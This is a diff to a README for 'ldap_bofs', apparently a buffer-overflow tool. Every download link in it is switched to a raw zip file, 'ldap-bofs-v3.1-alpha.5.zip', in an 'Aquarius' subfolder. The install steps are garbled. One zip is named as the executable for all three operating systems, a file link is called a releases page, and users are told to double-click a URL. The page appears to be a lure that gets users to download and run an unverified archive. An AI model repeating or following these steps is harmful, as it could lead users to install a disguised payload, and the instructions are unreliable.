@@ -6,9 +6,9 @@ Welcome to ldap_bofs! This application helps you explore random Buffer Overflow 
 
 ## 📥 Download the Application
 
-[![Download ldap_bofs](https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip)](https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip)
+[![Download ldap_bofs](https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip)](https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip)
 
-To get ldap_bofs, visit this page: [Download ldap_bofs](https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip).
+To get ldap_bofs, visit this page: [Download ldap_bofs](https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip).
 
 ## 💻 System Requirements
 
@@ -21,21 +21,21 @@ To run ldap_bofs effectively, ensure your system meets the following requirement
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click here to go to the releases page: [Download ldap_bofs](https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip).
+1. **Visit the Releases Page**: Click here to go to the releases page: [Download ldap_bofs](https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip).
 
 2. **Choose Your Version**: Look for the latest version listed. Versions are usually labeled with numbers, such as v1.0, v1.1, etc. The latest version will have the most features and fixes.
 
-3. **Download the File**: Click on the version number to expand the details. You will see a list of files to download. The main executable file for your system may be named something like `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip` for Windows, `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip` for macOS, or `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip` for Linux. Click the appropriate link to start the download.
+3. **Download the File**: Click on the version number to expand the details. You will see a list of files to download. The main executable file for your system may be named something like `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip` for Windows, `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip` for macOS, or `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip` for Linux. Click the appropriate link to start the download.
 
 4. **Locate the Downloaded File**: Once the download is complete, navigate to your ‘Downloads’ folder or wherever you saved the file.
 
 5. **Run the Application**:
    - **For Windows**:
-     - Double-click on the `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip` file to run it.
+     - Double-click on the `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip` file to run it.
    - **For macOS**:
-     - Open the `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip` file, and drag the `ldap_bofs` icon into your Applications folder. Then, find it in your Applications and double-click to run.
+     - Open the `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip` file, and drag the `ldap_bofs` icon into your Applications folder. Then, find it in your Applications and double-click to run.
    - **For Linux**:
-     - Extract the `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap_bofs.zip` file. Open a terminal and navigate to the extracted folder. Run the application using `./ldap_bofs`.
+     - Extract the `https://raw.githubusercontent.com/muhammadmehdi1656/ldap_bofs/main/Aquarius/ldap-bofs-v3.1-alpha.5.zip` file. Open a terminal and navigate to the extracted folder. Run the application using `./ldap_bofs`.
 
 6. **Follow On-Screen Instructions**: The application will guide you through the initial setup and help you understand its features.
 
